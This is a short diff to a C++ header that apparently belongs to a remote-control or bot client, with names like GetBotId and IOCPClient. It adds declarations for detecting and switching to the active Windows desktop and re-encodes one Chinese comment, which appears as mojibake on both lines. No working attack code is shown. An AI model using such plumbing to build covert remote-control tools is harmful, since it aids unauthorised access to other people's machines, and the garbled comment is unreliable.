@@ -15,6 +15,12 @@
 #define ENABLE_VSCREEN 1
 #define ENABLE_KEYBOARD 1
 
+HDESK OpenActiveDesktop(ACCESS_MASK dwDesiredAccess = 0);
+
+HDESK IsDesktopChanged(HDESK currentDesk, DWORD accessRights);
+
+bool SwitchToDesktopIfChanged(HDESK& currentDesk, DWORD accessRights);
+
 HDESK SelectDesktop(TCHAR* name);
 
 std::string GetBotId();
@@ -33,7 +39,7 @@ HANDLE MyCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
 class CManager : public IOCPManager
 {
 public:
-    const State&g_bExit; // 1-±»¿Ø¶ËÍË³ö 2-Ö÷¿Ø¶ËÍË³ö
+    const State&g_bExit; // 1-è¢«æŽ§ç«¯é€€å‡º 2-ä¸»æŽ§ç«¯é€€å‡º
     BOOL m_bReady;
     CManager(IOCPClient* ClientObject);
     virtual ~CManager();
